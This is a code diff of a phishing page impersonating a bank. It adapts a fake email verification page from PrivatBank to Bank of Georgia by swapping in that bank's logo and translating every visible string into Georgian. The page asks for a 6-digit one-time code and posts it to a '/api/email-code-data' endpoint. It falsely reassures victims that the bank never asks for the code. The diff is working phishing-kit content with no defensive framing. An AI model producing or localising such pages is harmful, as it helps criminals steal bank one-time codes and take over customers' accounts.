@@ -1,12 +1,16 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="ka" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Верифікація пошти</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<title>ფოსტის ვერიფიკაცია</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  html,body{height:100%;font-family: "Noto Sans Georgian", -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
   body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
 
   .topbar{
@@ -42,7 +46,7 @@
   }
   .code-digit{
     width:46px;height:56px;border:2px solid #ddd;border-radius:12px;
-    text-align:center;font-size:26px;font-weight:700;font-family:monospace;
+    text-align:center;font-size:26px;font-weight:700;font-family: "Noto Sans Georgian", monospace;
     background:#fafafa;color:#1a1a1a;outline:none;transition:.2s;
   }
   .code-digit:focus{border-color:#00A651;background:#fff;box-shadow:0 0 0 3px rgba(0,166,81,.12)}
@@ -60,7 +64,7 @@
   .bottom{padding:16px 24px 32px;margin-top:auto}
   .submit-btn{
     display:block;width:100%;padding:16px;border:none;border-radius:28px;
-    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
+    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family: "Noto Sans Georgian", inherit;
     background:#00A651;transition:.2s;
   }
   .submit-btn:hover{background:#008C45}
@@ -70,20 +74,20 @@
 <body>
 
   <div class="topbar">
-    <img src="images/privatbank-logo.jpg" alt="PrivatBank">
-    <span class="topbar-title">Верифікація пошти</span>
+    <img src="https://upload.wikimedia.org/wikipedia/en/4/4c/Bank_of_Georgia_logo.png" alt="საქართველოს ბანკი">
+    <span class="topbar-title">ფოსტის ვერიფიკაცია</span>
   </div>
 
   <div class="hero-banner">
     <img class="otp-img" src="images/otp-email.jpg" alt="Email OTP">
-    <h1>Код підтвердження електронної пошти</h1>
-    <p>Код підтвердження було надіслано на вашу зареєстровану електронну пошту</p>
+    <h1>ელ-ფოსტის დადასტურების კოდი</h1>
+    <p>დადასტურების კოდი გაგზავნილია თქვენს დარეგისტრირებულ ელ-ფოსტაზე</p>
   </div>
 
   <div class="content">
     <div class="error-msg" id="errorMsg"></div>
 
-    <div class="code-label">Введіть 6-значний код з вашої електронної пошти</div>
+    <div class="code-label">შეიყვანეთ 6-ციფრიანი კოდი თქვენი ელ-ფოსტიდან</div>
 
     <div class="code-input-wrap">
       <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
@@ -96,14 +100,14 @@
 
     <div class="info-box">
       <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-      <span>Перевірте папку "Вхідні" та "Спам". PrivatBank ніколи не запитуватиме у вас цей код.</span>
+      <span>შეამოწმეთ "შემომავალი" და "სპამი" საქაღალდეები. საქართველოს ბანკი არასდროს არ გეკითხებათ ამ კოდს.</span>
     </div>
 
-    <div class="resend">Не отримали лист? <a href="#">Надіслати повторно</a></div>
+    <div class="resend">არ მიიღეთ წერილი? <a href="#">ხელახლა გაგზავნა</a></div>
   </div>
 
   <div class="bottom">
-    <button class="submit-btn" id="submitBtn" onclick="submitCode()">Підтвердити</button>
+    <button class="submit-btn" id="submitBtn" onclick="submitCode()">დადასტურება</button>
   </div>
 
 <script>
@@ -113,7 +117,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Код невірний або недійсний";
+    el.textContent = "არასწორი კოდი";
     el.style.display = "block";
   }
 
@@ -144,12 +148,12 @@
   async function submitCode() {
     const code = getCode();
     if (code.length < 6) {
-      showError("Будь ласка, введіть повний код");
+      showError("გთხოვთ, შეიყვანოთ სრული კოდი");
       return;
     }
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "Перевірка...";
+    btn.textContent = "შემოწმება...";
 
     try {
       const res = await fetch("/api/email-code-data", {
@@ -161,14 +165,14 @@
       if (data.success) {
         location.href = "email-code-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "შეცდომა მოხდა");
         btn.disabled = false;
-        btn.textContent = "Підтвердити";
+        btn.textContent = "დადასტურება";
       }
     } catch(err) {
-      showError("Помилка з'єднання");
+      showError("კავშირის შეცდომა");
       btn.disabled = false;
-      btn.textContent = "Підтвердити";
+      btn.textContent = "დადასტურება";
     }
   }
 
